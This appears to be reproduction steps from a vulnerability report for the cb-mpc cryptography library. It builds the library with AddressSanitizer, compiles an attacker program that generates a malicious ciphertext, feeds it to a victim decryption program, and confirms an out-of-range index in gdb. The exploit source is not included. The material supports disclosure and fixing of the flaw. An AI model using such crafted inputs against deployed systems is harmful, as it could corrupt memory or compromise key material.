# Reproducing Finding 1

    # 1. OpenSSL 3.6.4 (cb-mpc pins these BN internals; the repo's own script)
    bash scripts/openssl/build-static-openssl-linux.sh      # or --prefix=<ossl>

    # 2. cb-mpc, Debug + ASan
    cmake -S . -B build-poc -G Ninja -DCMAKE_BUILD_TYPE=Debug -DBUILD_TESTS=OFF \
          -DCBMPC_OPENSSL_ROOT=<ossl> \
          -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer" \
          -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address"
    ninja -C build-poc

    # 3. attacker side (builds the malicious ciphertext, prints it as hex)
    g++ -g -O0 -std=c++17 -fsanitize=address -mpclmul -maes -msse4.1 -fno-operator-names -w \
        -I<cbmpc>/include -I<cbmpc>/include-internal -I<ossl>/include \
        gen_blob.cpp -o gen_blob <cbmpc>/lib/Debug/libcbmpc.a <ossl>/lib64/libcrypto.a -lpthread -ldl
    ./gen_blob > blob.txt

    # 4. victim side - PUBLIC API HEADERS ONLY
    g++ -g -O0 -std=c++17 -fsanitize=address \
        -I<cbmpc>/include -I<ossl>/include \
        victim_decrypt.cpp -o victim_decrypt <cbmpc>/lib/Debug/libcbmpc.a <ossl>/lib64/libcrypto.a -lpthread -ldl
    ./victim_decrypt blob.txt

    # 5. observe the out-of-range index
    gdb -q ./victim_decrypt
    (gdb) break src/cbmpc/protocol/pve_batch.cpp:183
    (gdb) run blob.txt
    (gdb) printf "i=%d n=%d Q.size=%lu\n", i, this->n, this->Q.size()

`evidence_gdb.txt` is the captured transcript. `gen_blob.cpp` uses internal headers only to lay out the
attacker's bytes; the entry point under test (`victim_decrypt.cpp`) uses `include/cbmpc/api/` only.
